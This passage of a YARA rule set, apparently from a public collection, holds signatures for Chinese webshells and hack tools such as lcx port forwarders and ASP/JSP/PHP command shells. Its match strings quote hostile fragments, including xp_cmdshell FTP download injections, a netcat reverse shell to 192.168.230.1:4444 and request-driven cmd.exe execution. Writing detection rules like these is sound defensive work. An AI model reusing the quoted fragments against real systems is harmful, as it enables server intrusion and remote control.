        $s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
        $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
    condition:
        filesize < 70KB and 2 of them
}

rule Txt_php_2 {
    meta:
        id = "7CeTv3zFbU6UQkjVvWAKBw"
        fingerprint = "v1_sha256_c08f62c3d468c2ebacd10fff6aa0c63bd303d627d487c070a9d22419bf6906cd"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file php.html"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "a7d5fcbd39071e0915c4ad914d31e00c7127bcfc"

    strings:
        $s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
        $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
        $s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
        $s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
        $s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
        $s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
        $s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
        $s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
    condition:
        filesize < 100KB and 4 of them
}

rule Txt_ftp {
    meta:
        id = "7MjVmWg6lwLDOmPaYFP4Qw"
        fingerprint = "v1_sha256_02eae9b19274ab7b816d7c336017af8f0fdd5273664eb37be92be12661f3ef1f"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file ftp.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "3495e6bcb5484e678ce4bae0bd1a420b7eb6ad1d"

    strings:
        $s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
        $s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
        $s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
        $s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
        $s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
        $s6 = "ftp -s:d:\\ftp.txt " fullword ascii
        $s7 = "echo bye>>d:\\ftp.txt " fullword ascii
    condition:
        filesize < 2KB and 2 of them
}

rule Txt_lcx {
    meta:
        id = "4xe5JRB4xCzNaIF9XisILi"
        fingerprint = "v1_sha256_48121824d3173b77b54b52dc60d3422a904ada46a6ebb20bb585086911cd8360"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file lcx.c"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "ddb3b6a5c5c22692de539ccb796ede214862befe"

    strings:
        $s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
        $s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
        $s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
        $s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
        $s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
    condition:
        filesize < 25KB and 2 of them
}

rule Txt_jspcmd {
    meta:
        id = "FulbSzLPSLpm6X1tiQVvd"
        fingerprint = "v1_sha256_d2cbf753fbd9e261234e6beb6f79aecb407a368704ae09d907d128d04c242053"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "1d4e789031b15adde89a4628afc759859e53e353"

    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
    condition:
        filesize < 1KB and 1 of them
}

rule Txt_jsp {
    meta:
        id = "7Np1ntHEgZAvvv8LtWRENy"
        fingerprint = "v1_sha256_039b145031cf1127cb1b2aeda063d578d9eb151559232d7e6049965111df1e28"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file jsp.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "74518faf08637c53095697071db09d34dbe8d676"

    strings:
        $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
    condition:
        filesize < 715KB and 2 of them
}

rule Txt_aspxlcx {
    meta:
        id = "36RreyBFHg5UlEgV90UtB4"
        fingerprint = "v1_sha256_a6e41e6882e74b0dd55ec4afbf6f8708e28267657e304c97d1304266fe1fbc93"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "453dd3160db17d0d762e032818a5a10baf234e03"

    strings:
        $s1 = "public string remoteip = " ascii
        $s2 = "=Dns.Resolve(host);" ascii
        $s3 = "public string remoteport = " ascii
        $s4 = "public class PortForward" ascii
    condition:
        uint16(0) == 0x253c and filesize < 18KB and all of them
}

rule Txt_xiao {
    meta:
        id = "7gAyoZTisPg5vNIdmTNiDw"
        fingerprint = "v1_sha256_e99c307482148e4d0eb660281fa70f2dcece200ac8aed032bbef41e421d2a155"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file xiao.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "b3b98fb57f5f5ccdc42e746e32950834807903b7"

    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
        $s4 = "function Command(cmd, str){" fullword ascii
        $s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii
    condition:
        filesize < 100KB and all of them
}

rule Txt_aspx {
    meta:
        id = "5h9ovJdzANrKolwnk2KAsg"
        fingerprint = "v1_sha256_43c386bfa88db77801b0494d6a5e4406688f957ffedeb4d2ecdd244549dec708"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file aspx.jpg"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "ce24e277746c317d887139a0d71dd250bfb0ed58"

    strings:
        $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
        $s2 = "Process[] p=Process.GetProcesses();" fullword ascii
        $s3 = "Copyright &copy; 2009 Bin" ascii
        $s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii
    condition:
        filesize < 100KB and all of them
}

rule Txt_Sql {
    meta:
        id = "5V50tJKhNV09WmJLbLktKf"
        fingerprint = "v1_sha256_0712b6736d8bdc1f19b3494dc3aab9e9a04dde167b5f843e319755cd311e29bd"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file Sql.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "f7813f1dfa4eec9a90886c80b88aa38e2adc25d5"

    strings:
        $s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
        $s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
        $s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
        $s4 = "session(\"login\")=\"\"" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule Txt_hello {
    meta:
        id = "5w5driImcSHkQM0sN06rRF"
        fingerprint = "v1_sha256_823a0a74b07c8f4821247b3cf0450069a9888d44ccd87144330da88594f260c0"
        version = "1.0"
        date = "2015-06-14"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Chinese Hacktool Set - Webshells - file hello.txt"
        category = "INFO"
        reference = "http://tools.zjqhr.com/"
        hash = "697a9ebcea6a22a16ce1a51437fcb4e1a1d7f079"

    strings:
        $s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
        $s2 = "myProcess.Start()" fullword ascii
        $s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii
    condition:
        filesize < 25KB and all of them
}
